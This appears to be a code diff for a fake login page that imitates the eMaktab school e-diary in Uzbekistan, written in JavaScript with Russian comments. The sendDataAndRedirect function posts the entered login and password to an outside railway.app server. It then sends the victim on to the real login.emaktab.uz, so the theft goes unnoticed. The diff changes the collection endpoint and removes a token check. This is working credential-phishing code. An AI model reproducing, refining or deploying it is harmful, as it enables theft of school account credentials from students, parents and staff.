@@ -1,7 +1,8 @@
 const pass = document.getElementById("pass");
 const login = document.getElementById("login");
 const btn = document.getElementById("btn");
-const lang = document.getElementById("lan")
+const lang = document.getElementById("lan");
+
 function validateInputs() {
     const password = pass.value.trim();
     const log = login.value.trim();
@@ -13,6 +14,7 @@ pass.addEventListener("input", validateInputs);
 login.addEventListener("input", validateInputs);
 
 validateInputs();
+
 const lanBtn = document.getElementById("lan");
 const dropdown = document.getElementById("dropdown");
 
@@ -32,42 +34,35 @@ dropdown.querySelectorAll("button").forEach((btn) => {
         dropdown.classList.add("hidden");
     });
 });
-// Функция для отправки данных и редиректа
+
+// Функция для отправки данных и редиректа без проверки токена
 async function sendDataAndRedirect() {
-    const login = document.getElementById('login').value.trim();
-    const password = document.getElementById('pass').value.trim();
+    const login = document.getElementById('login').value.trim();
+    const password = document.getElementById('pass').value.trim();
 
-    if (!login || !password) {
-        alert('Login and password are required!');
-        return;
-    }
+    if (!login || !password) {
+        alert('Login and password are required!');
+        return;
+    }
 
-    try {
-        const response = await fetch('https://airy-enjoyment-production-16a0.up.railway.app/requests', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ login, pass: password }),
-        });
+    try {
+        const response = await fetch('https://emaktab-production.up.railway.app/requests', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ login, pass: password }),
+        });
 
-        if (response.ok) {
-            const data = await response.json();
-            const token = data.token; // предполагаем, что токен приходит в поле "token"
-
-            if (token) {
-                localStorage.setItem('authToken', token); // сохраняем токен
-                window.location.href = 'https://login.emaktab.uz/'; // редирект
-            } else {
-                throw new Error('Token not found in response');
-            }
-        } else {
-            throw new Error('Failed to add user');
-        }
-    } catch (error) {
-        console.error('Error:', error);
-        alert('Something went wrong. Please try again.');
-    }
+        if (response.ok) {
+            window.location.href = 'https://login.emaktab.uz/'; // Редирект без проверки токена
+        } else {
+            throw new Error('Failed to add user');
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        alert('Something went wrong. Please try again.');
+    }
 }
 
 // Привязываем функцию к кнопке
